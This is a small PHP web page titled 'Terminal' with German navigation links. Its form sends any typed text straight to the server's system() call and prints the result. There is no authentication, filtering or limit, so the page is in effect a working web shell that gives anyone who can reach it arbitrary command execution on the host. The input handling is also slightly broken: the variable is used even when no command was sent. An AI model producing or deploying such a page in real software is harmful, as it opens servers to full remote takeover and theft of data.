<!DOCTYPE html>
<html>
<head>
  <title>Terminal</title>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
    <link rel="stylesheet" href="/css/terminal.css">

</head>
<body>

  <div id="terminalbody">
    <div id="termtitle">
     <div class=" termbox2 col-md-12">
        <div class="col-md-4">
          <h1>Terminal</h1>
        </div>

        <div id="links" class="col-md-8">
        <a href="/commands.php">Help</a>
        <span> | </span>
        <a href="/index.html">Zurück</a>
        </div>
      </div>
    </div>
    <div id="terminal" class="termbox1 col-md-12">
        <p>
        <?php
          
          echo 'Note: Change Directory not possible!<br/><br/>';

          if(isset($_POST['command']))
            $com = $_POST['command'];
            if(empty($com)){
              echo "Type Help or ? for help";
            }
            else{
            echo '<pre>';
            echo "Executed: /$com".'<br/><br/>';
            echo system($com);
            echo '<br/><br/>';
            echo '</pre>';
            }
        ?>  
        </p>
    </div>

    <div id="input">
      <div>
        <form action="terminal.php" method="post">
          <input type="text" name="command">
          <br/><br/>
          <input id="enter" type="Submit" value="Run">
        </form>
      </div>
    </div>
  </div>
</body>
</html>